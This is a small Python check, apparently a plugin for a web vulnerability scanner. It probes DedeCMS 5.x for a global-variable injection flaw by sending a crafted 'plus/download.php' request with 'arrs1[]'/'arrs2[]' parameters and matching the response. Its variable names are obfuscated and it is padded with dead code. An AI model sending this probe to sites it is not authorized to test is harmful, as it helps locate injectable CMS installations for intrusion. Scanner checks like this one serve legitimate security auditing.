# -*- coding: utf-8 -*-
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: dedecms_5.x_global_inj.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == 'dedecms':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, o0OoOoOO00 = curl.curl(o0OO00 + 'plus/download.php?arrs1[]=111&arrs1[]=112&arrs1[]=101&arrs1[]=110&arrs2[]=50&id=-2013')
    if i1iII1IiiIiI1 and iIiiiI1IiI1I1:
        I11i = util.decode_html(i1iII1IiiIiI1, iIiiiI1IiI1I1)
        if I11i and I11i.find('\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0\xe6\x89\x80\xe9\x9c\x80\xe8\xa6\x81\xe7\x9a\x84\xe8\xbd\xaf\xe4\xbb\xb6\xe8\xb5\x84\xe6\xba\x90') != -1 and I11i.find("'javascript:;'") != -1:
            security_hole(o0OO00)
            if 0:
                OOooo000oo0.i1 * ii1IiI1i % IIIiiIIii


if __name__ == '__main__':
    from dummy import *
